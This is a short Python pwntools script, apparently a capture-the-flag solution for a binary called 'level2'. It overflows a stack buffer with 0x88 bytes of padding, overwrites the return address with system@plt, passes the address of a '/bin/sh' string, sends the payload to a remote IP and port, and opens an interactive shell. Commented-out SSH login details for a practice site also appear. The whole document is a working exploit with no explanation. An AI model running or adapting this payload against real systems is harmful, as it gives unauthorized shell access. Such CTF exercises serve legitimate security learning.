#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./level2")
	
else:
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("111.198.29.45",30000)
#gdb.attach(io,"b *0x0000065B")
#context.log_level = "debug"
system_plt = 0x08048320
binsh_addr = 0x0804A024
payload = ""
payload += 0x88*"A"
payload += "junk"
payload += p32(system_plt)
payload += "junk"
payload += p32(binsh_addr)
io.sendline(payload)
io.interactive()
